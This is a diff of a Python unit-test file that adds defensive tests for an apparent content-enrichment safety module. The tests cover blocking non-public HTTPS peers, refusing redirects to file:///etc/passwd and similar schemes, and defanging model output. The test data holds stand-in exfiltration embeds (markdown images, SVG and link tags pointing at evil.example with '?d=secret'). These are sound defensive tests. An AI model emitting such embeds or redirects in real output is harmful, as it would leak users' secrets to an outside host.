@@ -171,9 +171,42 @@ class EnrichSafety(unittest.TestCase):
         self.assertEqual(s.detect_source("https://m.youtube.com/watch?v=1"), "youtube")
         self.assertEqual(s.detect_source("https://www.threads.net/@a/post/1"), "threads")
 
-    def test_remote_embeds_are_stripped_from_model_output(self):
-        md = 'ok ![x](https://evil.example/?d=secret) <img src="https://evil.example/a.png"> [link](https://a.b)'
-        self.assertEqual(s.strip_remote_embeds(md), "ok   [link](https://a.b)")
+    def test_https_peer_is_checked_before_tls(self):
+        """A plain-HTTP local server can't speak TLS: getting *our* refusal (not an SSL error) proves
+        the check ran before the ClientHello was sent."""
+        server = ThreadingHTTPServer(("127.0.0.1", 0), s.make_handler(Path("."), TOKEN, None))
+        threading.Thread(target=server.serve_forever, daemon=True).start()
+        try:
+            conn = s.PublicHTTPSConnection("127.0.0.1", server.server_port, timeout=5)
+            with self.assertRaisesRegex(OSError, "refused non-public peer"):
+                conn.connect()
+        finally:
+            server.shutdown()
+            server.server_close()
+
+    def test_only_http_handlers_and_http_redirects(self):
+        handlers = {type(h).__name__ for h in s.PUBLIC_ONLY_OPENER.handlers}
+        self.assertFalse(handlers & {"FTPHandler", "FileHandler", "DataHandler", "CacheFTPHandler"})
+        req = urllib.request.Request("https://example.com/")
+        for target in ("ftp://192.168.0.1/x", "file:///etc/passwd", "data:text/plain,x"):
+            self.assertIsNone(s.HttpOnlyRedirects().redirect_request(req, None, 302, "Found", {}, target), target)
+
+    def test_model_output_cannot_auto_load_remote_content(self):
+        md = "\n".join([
+            "![x](https://evil.example/a?d=secret)",       # inline image
+            "![y][ref]",                                    # reference-style image
+            "[ref]: https://evil.example/b?d=secret",
+            '<img src="https://evil.example/c">',
+            '<svg><image href="https://evil.example/d"/></svg>',
+            '<link rel="stylesheet" href="https://evil.example/e">',
+            "![[https://evil.example/f.png]]",              # URL as an Obsidian embed
+            "![[Local note]] [ok](https://a.b) <https://a.b>",
+        ])
+        out = s.defang_markdown(md)
+        self.assertNotIn("![", out.replace("![[Local note]]", ""))
+        self.assertNotRegex(out, r"<(?!https://a\.b>)")  # no raw HTML left, autolink kept
+        self.assertIn("![[Local note]]", out)
+        self.assertIn("[ok](https://a.b)", out)
 
 
 if __name__ == "__main__":
